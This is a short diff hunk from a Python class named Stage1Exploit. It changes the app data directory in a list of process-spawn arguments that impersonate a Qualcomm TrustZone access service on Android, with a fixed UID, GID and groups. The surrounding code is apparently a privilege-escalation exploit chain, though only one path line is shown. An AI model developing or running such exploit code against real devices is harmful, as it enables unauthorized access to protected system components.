@@ -192,7 +192,7 @@ class Stage1Exploit:
             "--setuid=10079",
             "--setgid=10079",
             "--setgroups=3003",
-            "--app-data-dir=/data/data/com.qualcomm.qti.qms.service.trustzoneaccess",
+            "--app-data-dir=/data/user/0/com.qualcomm.qti.qms.service.trustzoneaccess",
             "--runtime-args",
             "--nice-name=com.qualcomm.qti.qms.service.trustzoneaccess",
             "--target-sdk-version=28",
